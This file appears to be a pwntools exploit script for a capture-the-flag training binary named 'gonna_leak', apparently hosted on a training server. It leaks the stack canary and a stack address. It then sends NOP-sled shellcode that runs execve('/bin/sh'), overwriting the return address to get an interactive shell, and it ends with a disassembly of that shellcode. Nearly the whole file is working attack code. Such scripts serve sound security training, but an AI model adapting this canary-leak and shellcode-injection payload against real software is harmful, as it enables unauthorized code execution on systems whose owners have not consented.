from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gonna_leak")
    gdb.attach(r, """
        #b *0x04011d4
        c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2011)


print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = pwnlib.util.packing.u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

print("1:", r.recv())
r.send(b"C"*152)
r.recvuntil(b"> ")
r.read(152)
leaked_address = r.read(6) + b"\x00" + b"\x00"
address = pwnlib.util.packing.u64(leaked_address)
print("[!] leaked_address %#x" % address)

ret_address = address - 0x188
print("[!] ret_address %#x" % ret_address)

little = ret_address.to_bytes(length=8, byteorder="little")
#print(little)

shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xBF"+ little +b"\x48\x83\xC7\x2f\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"

ret_address = ret_address + 0x01
#print(len(shellcode))
payload =  shellcode + b"A"*49 + pwnlib.util.packing.p64(canary) + b"A"*8 + pwnlib.util.packing.p64(ret_address)
r.send(payload)


time.sleep(0.1)

r.sendline(b"")

r.interactive()


""" 
0:  90                      nop
1:  90                      nop
2:  90                      nop
3:  90                      nop
4:  90                      nop
5:  90                      nop
6:  90                      nop
7:  90                      nop
8:  90                      nop
9:  90                      nop
a:  90                      nop
b:  90                      nop
c:  90                      nop
d:  90                      nop
e:  90                      nop
f:  90                      nop
10: 90                      nop
11: 90                      nop
12: 48 bf a0 78 ab a1 ff    movabs rdi,0x7fffa1ab78a0
19: 7f 00 00
1c: 48 83 c7 2f             add    rdi,0x2f
20: 48 31 f6                xor    rsi,rsi
23: 48 31 d2                xor    rdx,rdx
26: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
2d: 0f 05                   syscall
2f: 00                      .byte 0x0
"""
